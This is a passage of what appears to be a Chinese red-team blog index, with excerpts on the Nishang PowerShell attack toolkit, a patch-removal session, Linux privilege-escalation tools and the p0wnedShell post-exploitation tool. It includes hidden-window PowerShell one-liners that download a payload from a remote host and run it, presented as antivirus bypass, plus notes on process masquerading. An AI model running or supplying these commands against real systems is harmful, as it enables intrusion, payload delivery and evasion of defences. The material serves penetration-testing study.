<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Remove-PoshRat.ps1">Remove-PoshRat</a></p>

<p>Clean the system after using Invoke-PoshRatHttps</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellWmi.ps1">Invoke-PowerShellWmi</a></p>

<p>Interactive PowerShell using WMI.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">Invoke-PowerShellIcmp</a></p>

<p>An interactive PowerShell reverse shell over ICMP.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRundll.ps1">Invoke-JSRatRundll</a></p>

<p>An interactive PowerShell reverse shell over HTTP using rundll32.exe.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRegsvr.ps1">Invoke-JSRatRegsvr</a></p>

<p>An interactive PowerShell reverse shell over HTTP using regsvr32.exe.</p>

<h4 id="utility">Utility</h4>
<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Add-Exfiltration.ps1">Add-Exfiltration</a></p>

<p>Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Add-Persistence.ps1">Add-Persistence</a></p>

<p>Add reboot persistence capability to a script.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Remove-Persistence.ps1">Remove-Persistence</a></p>

<p>Remote persistence added by the Add-Persistence script.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1">Do-Exfiltration</a></p>

<table>
  <tbody>
    <tr>
      <td>Pipe (</td>
      <td>) this to any script to exfiltrate the output.</td>
    </tr>
  </tbody>
</table>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Download.ps1">Download</a></p>

<p>Transfer a file to the target.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Parse_Keys.ps1">Parse_Keys</a></p>

<p>Parse keys logged by the keylogger.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1">Invoke-Encode</a></p>

<p>Encode and compress a script or string.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1">Invoke-Decode</a></p>

<p>Decode and decompress a script or string from Invoke-Encode.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Start-CaptureServer.ps1">Start-CaptureServer</a></p>

<p>Run a web server which logs Basic authentication and SMB hashes.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/ConvertTo-ROT13.ps1">ConvertTo-ROT13</a></p>

<p>Encode a string to ROT13 or decode a ROT13 string.</p>

<p><a href="https://github.com/samratashok/nishang/blob/master/Utility/Out-DnsTxt.ps1">Out-DnsTxt</a></p>

<p>Generate DNS TXT records which could be used with other scripts.</p>

<p>[Base64ToString]</p>

<p>[StringToBase64]</p>

<p>[ExetoText]</p>

<p>[TexttoExe]</p>

<h2 id="0x04-卸载系统补丁">0x04 卸载系统补丁</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Rvn0xsy\Downloads\nishang-master&gt; systeminfo

主机名:           DESKTOP-7KT7GL1
OS 名称:          Microsoft Windows 10 企业版
OS 版本:          10.0.15063 暂缺 Build 15063
OS 制造商:        Microsoft Corporation
OS 配置:          独立工作站
OS 构件类型:      Multiprocessor Free
注册的所有人:     Windows 用户
注册的组织:
产品 ID:          00329-00000-00003-AA343
初始安装日期:     2018/10/9, 22:03:48
系统启动时间:     2018/10/9, 22:03:27
系统制造商:       VMware, Inc.
系统型号:         VMware7,1
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~259
BIOS 版本:        VMware, Inc. VMW71.00V.6997262.B64.1710270607, 2017/10/27
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     4,067 MB
可用的物理内存:   2,521 MB
虚拟内存: 最大值: 5,475 MB
虚拟内存: 可用:   4,035 MB
虚拟内存: 使用中: 1,440 MB
页面文件位置:     C:\pagefile.sys
域:               WORKGROUP
登录服务器:       \\WIN-HPD6618QKUJ
修补程序:         安装了 3 个修补程序。
                  [01]: KB4022405
                  [02]: KB4025376
                  [03]: KB4025342
网卡:             安装了 2 个 NIC。
                  [01]: Intel(R) 82574L Gigabit Network Connection
                      连接名:      Ethernet0
                      启用 DHCP:   是
                      DHCP 服务器: 192.168.117.254
                      IP 地址
                        [01]: 192.168.117.179
                        [02]: fe80::34d3:6c58:d461:cc5e
                  [02]: Bluetooth Device (Personal Area Network)
                      连接名:      蓝牙网络连接
                      状态:        媒体连接已中断
Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
PS C:\Users\Rvn0xsy\Downloads\nishang-master&gt; Remove-Update All
Removing update 4022405 from the target.
Waiting for update removal to finish ...
Removing update 4025376 from the target.
Waiting for update removal to finish ...
Removing update 4025342 from the target.
Waiting for update removal to finish ...
</code></pre></div></div>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-19/0x02.png" alt="" /></p>

<h2 id="0x05-others">0x05 others</h2>

<p>可以参考：https://github.com/samratashok/nishang/blob/master/README.md</p>

<h2 id="ref">Ref</h2>

<ul>
  <li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6#execution-policy-scope">About Execution Policies</a></li>
</ul>
-->
          <!---->
          Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.
          <p>
            <a class="post-link" href="/archivers/2018-12-19/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-19/linux-privilege">Intranet Space - Linux Privilege</a>
        </h2>
        
        <div class="post-meta">Dec 19, 2018</div>

        <div class="post-excerpt">
          <!--<h2 id="0x00-linenum">0x00 LinEnum</h2>

<p>Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</p>

<p>Github:https://github.com/rebootuser/LinEnum</p>

<p>Usage:https://github.com/rebootuser/LinEnum/blob/master/README.md</p>

<p>Example:<code class="language-plaintext highlighter-rouge">$ ./ LinEnum.sh -s -k keyword -r report -e / tmp / -t</code></p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-19/0x03.png" alt="" /></p>

<h2 id="0x01-linux-exploit-suggester">0x01 linux-exploit-suggester</h2>

<p>Often during the penetration test engagement the security analyst faces the problem of identifying privilege escalation attack vectors on tested Linux machine(s). One of viable attack vectors is using publicly known Linux exploit to gain root privileges on tested machine. Of course in order to do that the analyst needs to identify the right PoC exploit, make sure that his target is affected by the associated vulnerability and finally modify the exploit to suit his target. The linux-exploit-suggester.sh tool is designed to help with these activities.</p>

<p>Usage:https://github.com/mzet-/linux-exploit-suggester#usage</p>

<p>Example:<code class="language-plaintext highlighter-rouge">$ ./linux-exploit-suggester.sh</code></p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-19/0x04.png" alt="" /></p>

-->
          Linux Privilege -&gt; Exploit
          <p>
            <a class="post-link" href="/archivers/2018-12-19/linux-privilege">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-18/3">Intranet Space - powershell bypass av</a>
        </h2>
        
        <div class="post-meta">Dec 18, 2018</div>

        <div class="post-excerpt">
          <!--<h2 id="0x00-downloadstring">0x00 DownloadString</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-BruteForce.ps1');
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -nop -w hidden -c $z="echo ($env:temp+'\N8l3M6fI.exe')"; iex (new-object System.Net.WebClient).DownloadFile('http://10.98.22.134:8080/yhtJPR2RVg', $z); invoke-item $z
</code></pre></div></div>

-->
          为了能运行powersploit、nishang脚本库，准备与AV来一场厮杀……
          <p>
            <a class="post-link" href="/archivers/2018-12-18/3">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2018-12-18/2">Intranet Space - p0wnedShell</a>
        </h2>
        
        <div class="post-meta">Dec 18, 2018</div>

        <div class="post-excerpt">
          <!--<h2 id="0x00-p0wnedshell">0x00 p0wnedShell</h2>

<p>p0wnedShell is an offensive PowerShell Runspace Post Exploitation host application written in C# that does not rely on powershell.exe but runs PowerShell commands and functions within a PowerShell run space environment (.NET). It has a lot of offensive PowerShell modules and binaries included making the process of Post Exploitation easier.</p>

<p>Github : https://github.com/Cn33liz/p0wnedShell</p>

<h2 id="0x01-p0wnedshell-功能">0x01 p0wnedShell 功能</h2>

<ul>
  <li>PowerSploit Invoke-Shellcode</li>
  <li>PowerSploit Invoke-ReflectivePEInjection</li>
  <li>PowerSploit Invoke-Mimikatz</li>
  <li>PowerSploit Invoke-TokenManipulation</li>
  <li>PowerSploit PowerUp</li>
  <li>PowerSploit PowerView</li>
  <li>HarmJ0y’s Invoke-Psexec</li>
  <li>Besimorhino’s PowerCat</li>
  <li>Nishang Invoke-PsUACme</li>
  <li>Nishang Invoke-Encode</li>
  <li>Nishang Get-PassHashes</li>
  <li>Nishang Invoke-CredentialsPhish</li>
  <li>Nishang Port-Scan</li>
  <li>Nishang Copy-VSS</li>
  <li>Kevin Robertson Invoke-Inveigh</li>
  <li>Kevin Robertson Tater</li>
  <li>FuzzySecurity Invoke-MS16-032</li>
</ul>

<h2 id="0x02-编译">0x02 编译</h2>

<pre><code class="language-C#">public static bool AutoMasq = true;

public static string masqBinary = @"C:\Windows\Notepad.exe";
</code></pre>

<p>如果AutoMasq为false，则不会进行进程注入，若为true，则会进行进程注入，伪装成C:\Windows\Notepad.exe.</p>

<p>需要Microsoft Visual Studio编译。</p>

<h2 id="0x03-lets-try">0x03 Let’s Try!</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119485035.jpg" alt="try" /></p>

<p>随便选择一个：13</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119485037.jpg" alt="try" /></p>

<p>会自动生成一个msf设置实例，根据提示设置一个监听器就好，最后按回车，就能获得会话。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119485038.jpg" alt="try" /></p>

<h2 id="0x04-总结">0x04 总结</h2>

<p>这个工具的优点就是加载powershell的行为不容易被AV查杀，但是编码只编码了一次，可能会被静态扫描到。</p>

<p>可以加一些反沙箱的功能，防止被传入云端。</p>

<p>还有一点就是不支持bypass uac，需要手动实现。</p>
-->
          p0wnedShell is an offensive PowerShell Runspace Post Exploitation host application written in C# that does not rely on powershell.exe but runs PowerShell commands and functions within a PowerShell run space environment (.NET). It has a lot of offensive PowerShell modules and binaries included making the process of Post Exploitation easier.
          <p>
            <a class="post-link" href="/archivers/2018-12-18/2">Read More »</a>
          </p>
        </div>
      </li>
    
  </ul>
  
  <!-- Pagination links -->
<div class="pagination">
  
    <a href="/page13" class="previous">PREV</a>
  
  <span class="page_number ">14 of 34</span>
  
    <a href="/page15" class="next">NEXT</a>
  
</div>

</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
